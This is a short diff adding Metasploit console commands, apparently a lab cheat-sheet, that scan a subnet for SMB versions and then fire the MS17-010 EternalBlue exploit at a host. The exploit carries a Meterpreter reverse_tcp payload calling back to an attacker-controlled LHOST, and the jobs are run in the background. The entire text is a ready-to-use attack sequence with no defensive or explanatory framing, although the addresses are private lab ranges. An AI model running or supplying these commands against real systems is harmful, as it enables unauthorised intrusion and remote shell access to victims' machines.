@@ -1,0 +1,15 @@
+# Quick port/service scan with auxiliary modules
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.10.10.0/24
+run
+
+# EternalBlue classic example (still appears in labs 2025–2026)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.56.101
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.1
+exploit
+
+# Background all exploits automatically (very useful)
+setg DisablePayloadHandler false   # optional
+exploit -j -z                      # -z = don't interact immediately
